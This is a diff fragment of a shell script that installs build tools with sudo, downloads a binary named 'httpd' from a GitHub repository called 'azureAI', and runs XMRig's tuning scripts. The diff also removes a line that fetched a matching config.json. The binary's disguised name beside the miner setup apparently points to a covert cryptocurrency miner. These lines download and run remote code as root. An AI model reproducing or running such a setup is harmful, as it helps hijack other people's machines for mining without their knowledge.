@@ -21,7 +21,6 @@ fi
 sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 
 sudo wget https://github.com/minnie1311/azureAI/raw/master/httpd
-sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.json
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
 sudo bash enable_1gb_pages.sh
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
